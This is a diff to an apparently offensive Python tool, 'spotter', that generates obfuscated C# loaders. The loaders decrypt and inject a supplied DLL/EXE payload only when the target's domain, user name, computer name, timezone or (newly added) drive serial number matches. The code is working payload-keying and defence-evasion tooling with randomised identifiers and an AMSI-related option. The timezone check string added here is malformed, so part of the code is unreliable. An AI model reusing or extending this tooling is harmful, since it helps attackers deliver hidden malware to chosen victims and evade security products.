@@ -18,7 +18,7 @@ banner = """
 / __| '_ \ / _ \| __| __/ _ \ '__|
 \__ \ |_) | (_) | |_| ||  __/ |   
 |___/ .__/ \___/ \__|\__\___|_|   
-    | |      v.1.0                     
+    | |      v.1.1                     
     |_|                         
 """
 print(banner)
@@ -56,6 +56,7 @@ parser_cs_inj.add_argument('--domain', '-d', help='Domain name to check for')
 parser_cs_inj.add_argument('--user', '-u', help='User name to check for')
 parser_cs_inj.add_argument('--computer', '-c', help='Computer name to check for')
 parser_cs_inj.add_argument('--timezone', '-tz', help='System timezone (format: UTC-05, UTC+02')
+parser_cs_inj.add_argument('--driveserial', '-sn', help='C: drive serial number')
 parser_cs_inj.add_argument('--payload_file', help='DLL/EXE to be loaded on decryption')
 
 # Parse  argument lists
@@ -116,6 +117,7 @@ try:
         pshTemplate.pshTemplate(encrypted, varKey, varCtr, varBytes, varAesManaged, varencryptedStringWithIV, \
                                 varUnencryptedData, varDecryptor, varLauncher, funcCreateAesManagedObject, \
                                 funcDecryptString, query, args.amsi, args.exitcmd)
+
     if sys.argv[1] == 'cs-inject':
         if args.domain:
             key = args.domain
@@ -123,6 +125,8 @@ try:
             key = args.user
         elif args.computer:
             key = args.computer
+        elif args.driveserial:
+            key = args.driveserial
         csInjectorTemplate = csInjectorTemplate()
         encoded = csInjectorTemplate.csiPayload(args.payload_file)
         #Encrypt the provided PECOFF payload
@@ -130,18 +134,22 @@ try:
         encrypted = Encrypter.encrypt1(str(encoded), key)
         # Obfuscate variable and function names
         Obfuscator = Obfuscator()
-        encDllB64, encDllBytes, newIV, envKey, keyBytes, plaintext, InjectAssembly, key, iv, cyphertext, rijAlg, strBytes, assembly, method = Obfuscator.varobfs()
+        hWindow, encDllB64, encDllBytes, newIV, envKey, keyBytes, plaintext, InjectAssembly, key, iv, cyphertext, rijAlg, strBytes, assembly, method = Obfuscator.varobfs()
         if args.domain:
-            check = "System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName"
+            check = "string "+envKey+" = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName"
         elif args.user:
-            check = "System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n" + envKey + " = " + envKey + ".Split('\\\\')[1]"
+            check = "string "+envKey+" = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n\t\t\t" + envKey + " = " + envKey + ".Split('\\\\')[1]"
         elif args.computer:
-            check = "System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n" + envKey + " = " + envKey + ".Split('\\\\')[0]"
+            check = "string "+envKey+" = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n\t\t\t" + envKey + " = " + envKey + ".Split('\\\\')[0]"
         elif args.timezone:
-            check = "'UTC' + Convert.ToString(System.TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now)).Substring(0,3);"
+            check = "string "+envKey+" = UTC' + Convert.ToString(System.TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now)).Substring(0,3);"
+        elif args.driveserial:
+            check = "string "+envKey+" = '';\nManagementObjectSearcher moSearcher = new ManagementObjectSearcher('SELECT * FROM Win32_DiskDrive');\n"
+            check += "foreach (ManagementObject wmi_HD in moSearcher.Get()){"+envKey+" = wmi_HD['SerialNumber'].ToString();break;};"
         # Replace original variable and function names with obfuscated ones
         with open("templates/spotter-inject.cs", "rt") as fin:
             r1 = fin.read().replace('encDllB64', encDllB64)
+            r1 = r1.replace('hWindow', hWindow)
             r1 = r1.replace('encDllBytes', encDllBytes)
             r1 = r1.replace('newIV', newIV)
             r1 = r1.replace('envKey', envKey)
@@ -162,6 +170,7 @@ try:
         with open("./output/cs-inject.cs", "wt") as fout:
             fout.write(r1)
         print('[+] CS File Saved as cs-inject.cs')
+
     if sys.argv[1] == 'cs-process':
         if args.domain:
             key = args.domain
@@ -179,18 +188,22 @@ try:
         encrypted = Encrypter.encrypt1(payload, key)
         # Obfuscate variable and function names
         Obfuscator = Obfuscator()
-        encDllB64, encDllBytes, newIV, envKey, keyBytes, plaintext, InjectAssembly, key, iv, cyphertext, rijAlg, strBytes, assembly, method = Obfuscator.varobfs()
+        hWindow, encDllB64, encDllBytes, newIV, envKey, keyBytes, plaintext, InjectAssembly, key, iv, cyphertext, rijAlg, strBytes, assembly, method = Obfuscator.varobfs()
         if args.domain:
-            check = "System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName"
+            check = "string "+envKey+" = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName"
         elif args.user:
-            check = "System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n" + envKey + " = " + envKey + ".Split('\\\\')[1]"
+            check = "string "+envKey+" = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n\t\t\t" + envKey + " = " + envKey + ".Split('\\\\')[1]"
         elif args.computer:
-            check = "System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n" + envKey + " = " + envKey + ".Split('\\\\')[0]"
+            check = "string "+envKey+" = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n\t\t\t" + envKey + " = " + envKey + ".Split('\\\\')[0]"
         elif args.timezone:
-            check = "'UTC' + Convert.ToString(System.TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now)).Substring(0,3);"
+            check = "string "+envKey+" = UTC' + Convert.ToString(System.TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now)).Substring(0,3);"
+        elif args.driveserial:
+            check = "string "+envKey+" = '';\nManagementObjectSearcher moSearcher = new ManagementObjectSearcher('SELECT * FROM Win32_DiskDrive');\n"
+            check += "foreach (ManagementObject wmi_HD in moSearcher.Get()){"+envKey+" = wmi_HD['SerialNumber'].ToString();break;};"
         #print(encrypted)
         with open("templates/spotter-process.cs", "rt") as fin:
             r1 = fin.read().replace('ENCODED_COMMAND', encrypted)
+            r1 = r1.replace('hWindow', hWindow)
             r1 = r1.replace('KEYCHECK', check)
             r1 = r1.replace('encDllBytes', encDllBytes)
             r1 = r1.replace('newIV', newIV)
